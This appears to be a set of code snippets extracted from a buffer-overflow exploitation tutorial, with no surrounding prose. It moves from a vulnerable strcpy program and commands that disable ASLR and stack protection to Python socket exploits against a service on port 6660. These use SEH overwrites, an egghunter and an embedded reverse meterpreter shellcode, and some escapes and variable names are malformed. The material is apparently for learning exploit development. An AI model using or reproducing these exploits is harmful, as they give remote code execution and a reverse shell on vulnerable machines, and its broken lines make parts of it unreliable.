["```\n#include <stdio.h> \n#include <string.h> \n#include <stdlib.h> \nint main(int argc, char *argv[]) \n{ \n    char buffer[5]; \n    if (argc < 2) \n        { \n            printf(\"strcpy() NOT executed....\\n\"); \n            printf(\"Syntax: %s <characters>\\n\", argv[0]); \n            exit(0); \n        } \n    strcpy(buffer, argv[1]); \n    printf(\"buffer content= %s\\n\", buffer); \n\n    // you may want to try strcpy_s() \n    printf(\"strcpy() executed...\\n\"); \n    return 0; \n} \n```", "```\ngcc program.c -o program\n```", "```\n./program 1234  \n```", "```\n./program 12345   \n```", "```\n        #include<stdio.h> \n        #include<string.h> \n        void main(int argc, char *argv[]) \n        { \n            char buf[120]; \n            strcpy(buf, argv[1]); \n            printf(buf); \n        }  \n```", "```\n gcc -ggdb name.c -o name -fno-stack-protector -z execstack\n```", "```\n echo 0 > /proc/sys/kernel/randomize_va_space\n```", "```\n gdb ./name\n```", "```\n r $(python -c 'print \"A\"*124')\n```", "```\n r $(python -c 'print \"A\"*90+\"B\"*9+\"C\"*25')\n```", "```\n x/16x $esp\n```", "```\n \"\\x90\"*76+\"\\x6a\\x0bx58x31\\xf6\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\\n        x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\xcd\\x80\"\n        +\"\\xa0\\xff\\xf1\\xbf\"+\"\\x90\"*20\n```", "```\n r $(python -c print' \"\\x90\"*76+\"\\x6a\\x0bx58x31\\xf6\\x56\\x68\\\n        x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\\n        xcd\\x80\"+\"\\xa0\\xff\\xf1\\xbf\"+\"\\x90\"*20')\n```", "```\n        import io\n        a=\"A\"*30000\n        file =open(\"crash.m3u\",\"w\")\n        file.write(a)\n        file.close()\n```", "```\n locate pattern_create\n```", "```\n ruby /path/to/script/pattern_create.rb 5000\n```", "```\n ruby /path/to/script/pattern_offset.rb 5000\n```", "```\n msfvenom windows/exec CMD=calc.exe R | msfencode -b\n        '\\x00\\x0A\\x0D' -t c\n```", "```\n        #!/usr/bin/pythonimport socket\n        import socket\n        address=\"192.168.110.6\"\n        port=6660    \n        buffer = \"USV \" + \"\\x41\" * 2500 + \"\\r\\n\\r\\n\"\n        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        connect=sock.connect((address, port))\n        sock.send(buffer)\n        sock.close()\n```", "```\n ruby /path/to/script/pattern_create.rb -l 2500\n```", "```\n ruby /path/to/script/pattern_offset.rb -q 423267412\n```", "```\n        #!/usr/bin/python\n        import socket address=\"192.168.110.12\"\n        port=6660 buffer = \"USV \"\n        buffer+= \"A\" * 962\n        buffer+= \"\\xcc\\xcc\\xcc\\xcc\"\n        buffer+= \"BBBB\"\n        buffer+= \"C\" * (2504 - len(buffer))\n        buffer+= \"\\r\\n\\r\\n\"\n        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        connect=sock.connect((target_address,target_port)) \n        sock.send(buffer)\n        sock.close()\n```", "```\n /path/to/msfpescan -f vbajet32.dll -s\n```", "```\n msfvenom -p windows/meterpreter/reverse_tcp -f py\n        -b \"\\x00\\xff\\x20\\x25\\x0a\\x-d\" -v buffer\n```", "```\n        #!/usr/bin/python\n        import socket\n        target_address=\"192.168.110.12\"\n        target_port=6660\n        buffer = \"USV \"\n        buffer += \"\\x41\" * 962 #offset\n        # 6 Bytes SHORT jump to shellcode\n        buffer += \"\\xeb\\x06\\x90\\x90\"\n        # POP+POP+RET 0x0f9a196a\n        buffer += \"\\x6a\\x19\\x9a\\x0f\"\n        buffer += \"\\x90\" * 16\n        #Shellcode Reverse meterpreter.\n        buffer += \"\\xdb\\xde\\xd9\\x74\\x24\\xf4\\xbf\\xcf\\x9f\\xb1\\x9a\\x5e\"\n        buffer += \"\\x31\\xc9\\xb1\\x54\\x83\\xee\\xfc\\x31\\x7e\\x14\\x03\\x7e\"\n        buffer += \"\\xdb\\x7d\\x44\\x66\\x0b\\x03\\xa7\\x97\\xcb\\x64\\x21\\x72\"\n        buffer += \"\\xfa\\xa4\\x55\\xf6\\xac\\x14\\x1d\\x5a\\x40\\xde\\x73\\x4f\"\n        buffer += \"\\xd3\\x92\\x5b\\x60\\x54\\x18\\xba\\x4f\\x65\\x31\\xfe\\xce\"\n        buffer += \"\\xe5\\x48\\xd3\\x30\\xd4\\x82\\x26\\x30\\x11\\xfe\\xcb\\x60\"\n        buffer += \"\\xca\\x74\\x79\\x95\\x7f\\xc0\\x42\\x1e\\x33\\xc4\\xc2\\xc3\"\n        buffer += \"\\x83\\xe7\\xe3\\x55\\x98\\xb1\\x23\\x57\\x4d\\xca\\x6d\\x4f\"\n        buffer += \"\\x92\\xf7\\x24\\xe4\\x60\\x83\\xb6\\x2c\\xb9\\x6c\\x14\\x11\"\n        buffer += \"\\x76\\x9f\\x64\\x55\\xb0\\x40\\x13\\xaf\\xc3\\xfd\\x24\\x74\"\n        buffer += \"\\xbe\\xd9\\xa1\\x6f\\x18\\xa9\\x12\\x54\\x99\\x7e\\xc4\\x1f\"\n        buffer += \"\\x95\\xcb\\x82\\x78\\xb9\\xca\\x47\\xf3\\xc5\\x47\\x66\\xd4\"\n        buffer += \"\\x4c\\x13\\x4d\\xf0\\x15\\xc7\\xec\\xa1\\xf3\\xa6\\x11\\xb1\"\n        buffer += \"\\x5c\\x16\\xb4\\xb9\\x70\\x43\\xc5\\xe3\\x1c\\xa0\\xe4\\x1b\"\n        buffer += \"\\xdc\\xae\\x7f\\x6f\\xee\\x71\\xd4\\xe7\\x42\\xf9\\xf2\\xf0\"\n        buffer += \"\\xa5\\xd0\\x43\\x6e\\x58\\xdb\\xb3\\xa6\\x9e\\x8f\\xe3\\xd0\"\n        buffer += \"\\x37\\xb0\\x6f\\x21\\xb8\\x65\\x05\\x24\\x2e\\x46\\x72\\x48\"\n        buffer += \"\\xa5\\x2e\\x81\\x95\\xa8\\xf2\\x0c\\x73\\x9a\\x5a\\x5f\\x2c\"\n        buffer += \"\\x5a\\x0b\\x1f\\x9c\\x32\\x41\\x90\\xc3\\x22\\x6a\\x7a\\x6c\"\n        buffer += \"\\xc8\\x85\\xd3\\xc4\\x64\\x3f\\x7e\\x9e\\x15\\xc0\\x54\\xda\"\n        buffer += \"\\x15\\x4a\\x5d\\x1a\\xdb\\xbb\\x14\\x08\\x0b\\xda\\xd6\\xd0\"\n        buffer += \"\\xcb\\x77\\xd7\\xba\\xcf\\xd1\\x80\\x52\\xcd\\x04\\xe6\\xfc\"\n        buffer += \"\\x2e\\x63\\x74\\xfa\\xd0\\xf2\\x4d\\x70\\xe6\\x60\\xf2\\xee\"\n        buffer += \"\\x06\\x65\\xf2\\xee\\x50\\xef\\xf2\\x86\\x04\\x4b\\xa1\\xb3\"\n        buffer += \"\\x4b\\x46\\xd5\\x6f\\xd9\\x69\\x8c\\xdc\\x4a\\x02\\x32\\x3a\"\n        buffer += \"\\xbc\\x8d\\xcd\\x69\\xbf\\xca\\x32\\xef\\x9d\\x72\\x5b\\x0f\"\n        buffer += \"\\xa1\\x82\\x9b\\x65\\x21\\xd3\\xf3\\x72\\x0e\\xdc\\x33\\x7a\"\n        buffer += \"\\x85\\xb5\\x5b\\xf1\\x4b\\x77\\xfd\\x06\\x46\\xd9\\xa3\\x07\"\n        buffer += \"\\x64\\xc2\\xb2\\x89\\x8b\\xf5\\xba\\x6b\\xb0\\x23\\x83\\x19\"\n        buffer += \"\\xf1\\xf7\\xb0\\x12\\x48\\x55\\x90\\xb8\\xb2\\xc9\\xe2\\xe8\"\n        # NOP SLED\n        buffer += \"\\x90\" * (2504 - len(buffer))\n        buffer += \"\\r\\n\\r\\n\"\n        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        connect=sock.connect((target_address,target_port))\n        sock.send(buffer)\n        print \"Sent!!\"\n        sock.close()\n```", "```\n        #!/usr/bin/python\n        import socket\n        target_address=\"192.168.110.12\"\n        target_port=6660\n        buffer = \"USV \"\n        buffer += \"\\x41\" * 962 #offset\n        # 6 Bytes SHORT jump to shellcode\n        buffer += \"\\xeb\\x06\\x90\\x90\"\n        # POP+POP+RET 0x0f9a196a\n        buffer += \"\\x6a\\x19\\x9a\\x0f\"\n        buffer += \"\\x90\" * 16\n        #Shellcode Reverse meterpreter.\n        buffer += \"\\xdb\\xde\\xd9\\x74\\x24\\xf4\\xbf\\xcf\\x9f\\xb1\\x9a\\x5e\"\n        buffer += \"\\x31\\xc9\\xb1\\x54\\x83\\xee\\xfc\\x31\\x7e\\x14\\x03\\x7e\"\n        buffer += \"\\xdb\\x7d\\x44\\x66\\x0b\\x03\\xa7\\x97\\xcb\\x64\\x21\\x72\" \n        buffer += \"\\xfa\\xa4\\x55\\xf6\\xac\\x14\\x1d\\x5a\\x40\\xde\\x73\\x4f\"\n        buffer += \"\\xd3\\x92\\x5b\\x60\\x54\\x18\\xba\\x4f\\x65\\x31\\xfe\\xce\"\n        buffer += \"\\xe5\\x48\\xd3\\x30\\xd4\\x82\\x26\\x30\\x11\\xfe\\xcb\\x60\"\n        buffer += \"\\xca\\x74\\x79\\x95\\x7f\\xc0\\x42\\x1e\\x33\\xc4\\xc2\\xc3\"\n        buffer += \"\\x83\\xe7\\xe3\\x55\\x98\\xb1\\x23\\x57\\x4d\\xca\\x6d\\x4f\"\n        buffer += \"\\x92\\xf7\\x24\\xe4\\x60\\x83\\xb6\\x2c\\xb9\\x6c\\x14\\x11\"\n        buffer += \"\\x76\\x9f\\x64\\x55\\xb0\\x40\\x13\\xaf\\xc3\\xfd\\x24\\x74\"\n        buffer += \"\\xbe\\xd9\\xa1\\x6f\\x18\\xa9\\x12\\x54\\x99\\x7e\\xc4\\x1f\"\n        buffer += \"\\x95\\xcb\\x82\\x78\\xb9\\xca\\x47\\xf3\\xc5\\x47\\x66\\xd4\"\n        buffer += \"\\x4c\\x13\\x4d\\xf0\\x15\\xc7\\xec\\xa1\\xf3\\xa6\\x11\\xb1\" \n        buffer += \"\\x5c\\x16\\xb4\\xb9\\x70\\x43\\xc5\\xe3\\x1c\\xa0\\xe4\\x1b\"\n        buffer += \"\\xdc\\xae\\x7f\\x6f\\xee\\x71\\xd4\\xe7\\x42\\xf9\\xf2\\xf0\"\n        buffer += \"\\xa5\\xd0\\x43\\x6e\\x58\\xdb\\xb3\\xa6\\x9e\\x8f\\xe3\\xd0\"\n        buffer += \"\\x37\\xb0\\x6f\\x21\\xb8\\x65\\x05\\x24\\x2e\\x46\\x72\\x48\"\n        buffer += \"\\xa5\\x2e\\x81\\x95\\xa8\\xf2\\x0c\\x73\\x9a\\x5a\\x5f\\x2c\"\n        buffer += \"\\x5a\\x0b\\x1f\\x9c\\x32\\x41\\x90\\xc3\\x22\\x6a\\x7a\\x6c\"\n        buffer += \"\\xc8\\x85\\xd3\\xc4\\x64\\x3f\\x7e\\x9e\\x15\\xc0\\x54\\xda\"\n        buffer += \"\\x15\\x4a\\x5d\\x1a\\xdb\\xbb\\x14\\x08\\x0b\\xda\\xd6\\xd0\"\n        buffer += \"\\xcb\\x77\\xd7\\xba\\xcf\\xd1\\x80\\x52\\xcd\\x04\\xe6\\xfc\"\n        buffer += \"\\x2e\\x63\\x74\\xfa\\xd0\\xf2\\x4d\\x70\\xe6\\x60\\xf2\\xee\"\n        buffer += \"\\x06\\x65\\xf2\\xee\\x50\\xef\\xf2\\x86\\x04\\x4b\\xa1\\xb3\"\n        buffer += \"\\x4b\\x46\\xd5\\x6f\\xd9\\x69\\x8c\\xdc\\x4a\\x02\\x32\\x3a\"\n        buffer += \"\\xbc\\x8d\\xcd\\x69\\xbf\\xca\\x32\\xef\\x9d\\x72\\x5b\\x0f\"\n        buffer += \"\\xa1\\x82\\x9b\\x65\\x21\\xd3\\xf3\\x72\\x0e\\xdc\\x33\\x7a\"\n        buffer += \"\\x85\\xb5\\x5b\\xf1\\x4b\\x77\\xfd\\x06\\x46\\xd9\\xa3\\x07\"\n        buffer += \"\\x64\\xc2\\xb2\\x89\\x8b\\xf5\\xba\\x6b\\xb0\\x23\\x83\\x19\"\n        buffer += \"\\xf1\\xf7\\xb0\\x12\\x48\\x55\\x90\\xb8\\xb2\\xc9\\xe2\\xe8\"\n        # NOP SLED\n        buffer += \"\\x90\" * (2504 - len(buffer))\n        buffer += \"\\r\\n\\r\\n\"\n        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        connect=sock.connect((target_address,target_port))\n        sock.send(buffer)\n        print \"Sent!!\"\n        sock.close()\n```", "```\n        #!/usr/bin/python\n        import socket\n        target_address=\"192.168.110.12\"\n        target_port=6660\n        #Egghunter Shellcode 32 bytes\n        egghunter = \"\"\n        egghunter += \"\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\\n          x2e\\x3c\\x05\\x5a\\x74\"\n        egghunter += \"\\xef\\xb8\\x77\\x30\\x30\\x74\\x8b\\xfa\\xaf\\x75\\xea\\xaf\n          \\x75\\xe7\\xff\\xe7\"\n        # 6 Bytes SHORT jump to shellcode\n        nseh = \"\\xeb\\x09\\x90\\x90\"\n        # POP+POP+RET 0x0f9a196a\n        seh = \"\\x6a\\x19\\x9a\\x0f\"\n        #Shellcode Reverse meterpreter. 360 bytes\n        buffer = \"\"\n        buffer += \"\\xdb\\xde\\xd9\\x74\\x24\\xf4\\xbf\\xcf\\x9f\\xb1\\x9a\\x5e\"\n        buffer += \"\\x31\\xc9\\xb1\\x54\\x83\\xee\\xfc\\x31\\x7e\\x14\\x03\\x7e\"\n        buffer += \"\\xdb\\x7d\\x44\\x66\\x0b\\x03\\xa7\\x97\\xcb\\x64\\x21\\x72\"\n        buffer += \"\\xfa\\xa4\\x55\\xf6\\xac\\x14\\x1d\\x5a\\x40\\xde\\x73\\x4f\"\n        buffer += \"\\xd3\\x92\\x5b\\x60\\x54\\x18\\xba\\x4f\\x65\\x31\\xfe\\xce\"\n        buffer += \"\\xe5\\x48\\xd3\\x30\\xd4\\x82\\x26\\x30\\x11\\xfe\\xcb\\x60\"\n        buffer += \"\\xca\\x74\\x79\\x95\\x7f\\xc0\\x42\\x1e\\x33\\xc4\\xc2\\xc3\"\n        buffer += \"\\x83\\xe7\\xe3\\x55\\x98\\xb1\\x23\\x57\\x4d\\xca\\x6d\\x4f\"\n        buffer += \"\\x92\\xf7\\x24\\xe4\\x60\\x83\\xb6\\x2c\\xb9\\x6c\\x14\\x11\"\n        buffer += \"\\x76\\x9f\\x64\\x55\\xb0\\x40\\x13\\xaf\\xc3\\xfd\\x24\\x74\"\n        buffer += \"\\xbe\\xd9\\xa1\\x6f\\x18\\xa9\\x12\\x54\\x99\\x7e\\xc4\\x1f\"\n        buffer += \"\\x95\\xcb\\x82\\x78\\xb9\\xca\\x47\\xf3\\xc5\\x47\\x66\\xd4\"\n        buffer += \"\\x4c\\x13\\x4d\\xf0\\x15\\xc7\\xec\\xa1\\xf3\\xa6\\x11\\xb1\"\n        buffer += \"\\x5c\\x16\\xb4\\xb9\\x70\\x43\\xc5\\xe3\\x1c\\xa0\\xe4\\x1b\"\n        buffer += \"\\xdc\\xae\\x7f\\x6f\\xee\\x71\\xd4\\xe7\\x42\\xf9\\xf2\\xf0\"\n        buffer += \"\\xa5\\xd0\\x43\\x6e\\x58\\xdb\\xb3\\xa6\\x9e\\x8f\\xe3\\xd0\"\n        buffer += \"\\x37\\xb0\\x6f\\x21\\xb8\\x65\\x05\\x24\\x2e\\x46\\x72\\x48\"\n        buffer += \"\\xa5\\x2e\\x81\\x95\\xa8\\xf2\\x0c\\x73\\x9a\\x5a\\x5f\\x2c\"\n        buffer += \"\\x5a\\x0b\\x1f\\x9c\\x32\\x41\\x90\\xc3\\x22\\x6a\\x7a\\x6c\"\n        buffer += \"\\xc8\\x85\\xd3\\xc4\\x64\\x3f\\x7e\\x9e\\x15\\xc0\\x54\\xda\"\n        buffer += \"\\x15\\x4a\\x5d\\x1a\\xdb\\xbb\\x14\\x08\\x0b\\xda\\xd6\\xd0\"\n        buffer += \"\\xcb\\x77\\xd7\\xba\\xcf\\xd1\\x80\\x52\\xcd\\x04\\xe6\\xfc\"\n        buffer += \"\\x2e\\x63\\x74\\xfa\\xd0\\xf2\\x4d\\x70\\xe6\\x60\\xf2\\xee\"\n        buffer += \"\\x06\\x65\\xf2\\xee\\x50\\xef\\xf2\\x86\\x04\\x4b\\xa1\\xb3\"\n        buffer += \"\\x4b\\x46\\xd5\\x6f\\xd9\\x69\\x8c\\xdc\\x4a\\x02\\x32\\x3a\"\n        buffer += \"\\xbc\\x8d\\xcd\\x69\\xbf\\xca\\x32\\xef\\x9d\\x72\\x5b\\x0f\"\n        buffer += \"\\xa1\\x82\\x9b\\x65\\x21\\xd3\\xf3\\x72\\x0e\\xdc\\x33\\x7a\"\n        buffer += \"\\x85\\xb5\\x5b\\xf1\\x4b\\x77\\xfd\\x06\\x46\\xd9\\xa3\\x07\"\n        buffer += \"\\x64\\xc2\\xb2\\x89\\x8b\\xf5\\xba\\x6b\\xb0\\x23\\x83\\x19\"\n        buffer += \"\\xf1\\xf7\\xb0\\x12\\x48\\x55\\x90\\xb8\\xb2\\xc9\\xe2\\xe8\"\n        nop = \"\\x90\" * 301\n        tag = \"w00tw00t\"\n        buffer1 = \"USV \"\n        buffer1 += nop * 2 + \"\\x90\" * 360\n        buffer1 += nseh + seh # 8\n        buffer1 += \"\\x90\" * 6 #\n        buffer1 += egghunter\n        buffer1 += nop\n        buffer1 += tag\n        buffer1 += buffer\n        buffer1 += \"\\x90\" * (3504 - len(buffer))\n        buffer1 += \"\\r\\n\\r\\n\"\n        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        connect=sock.connect((target_address,target_port))\n        sock.send(buffer1)\n        print \"Sent!!\"\n        sock.close()\n```"]